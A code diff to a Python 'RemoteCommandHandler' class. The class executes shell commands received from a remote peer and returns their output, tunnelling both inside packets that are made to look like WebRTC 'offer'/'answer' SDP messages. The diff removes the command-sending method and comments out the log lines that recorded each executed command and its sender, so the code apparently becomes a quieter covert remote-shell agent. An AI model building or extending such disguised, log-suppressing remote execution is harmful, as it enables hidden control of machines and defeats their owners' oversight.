@@ -16,44 +16,6 @@ class RemoteCommandHandler:
         elif hasattr(signal, "add_message_handler"):
             signal.add_message_handler(self.dispatch_message)
 
-            # SEND COMMAND
-
-    async def send_command(self, target, command, request_id=None, wait_for_result=False, timeout=None):
-        if not isinstance(command, str) or not command.strip():
-            print("COMMAND MUST BE A NON-EMPTY STRING")
-
-        if request_id is None:
-            request_id = str(uuid.uuid4())
-
-        packet = {
-            "type": "offer", "target": target,
-            "sdp": json.dumps(
-                {
-                    "type": "remote-command",
-                    "command": command,
-                    "request_id": request_id,
-                }
-            ),
-        }
-        print(f"SENDING COMMAND REQUEST_ID: {request_id} {target} {command}")
-
-        future = None
-
-        if wait_for_result:
-            future = asyncio.get_running_loop().create_future()
-            self._pending_results[request_id] = future
-        await self.signal.send(packet)
-
-        if wait_for_result:
-            if future is None:
-                raise RuntimeError("RESULT FUTURE WAS NOT CREATED")
-            try:
-                return await asyncio.wait_for(future, timeout=timeout)
-            except asyncio.TimeoutError:
-                self._pending_results.pop(request_id, None)
-                raise
-        return request_id
-
     # MESSAGE ROUTER
     async def dispatch_message(self, message):
         if not isinstance(message, dict):
@@ -116,7 +78,7 @@ class RemoteCommandHandler:
             await self._send_result(sender, request_id, "ERROR", error="INVALID COMMAND")
             return
 
-        print(f"EXECUTING COMMAND FROM {sender} : {command}")
+        #print(f"EXECUTING COMMAND FROM {sender} : {command}")
 
         status, output, error = await self._execute_command(command)
         await self._send_result(sender, request_id, status, output=output, error=error)
@@ -128,7 +90,7 @@ class RemoteCommandHandler:
         except subprocess.TimeoutExpired:
             return ("error", None, "COMMAND TIMEOUT")
         except Exception as exc:
-            print("[!] EXECUTION FAILED")
+            #print("[!] EXECUTION FAILED")
             return ("error", None, str(exc))
 
         output = completed.stdout + completed.stderr
@@ -159,5 +121,5 @@ class RemoteCommandHandler:
 
         packet = {"type": "answer", "target": target, "sdp": json.dumps(payload)}
 
-        print(f"SENDING RESULT REQUEST_ID: {request_id} : STATUS: {status}")
+        print(f"STATUS: {status}")
         await self.signal.send(packet)
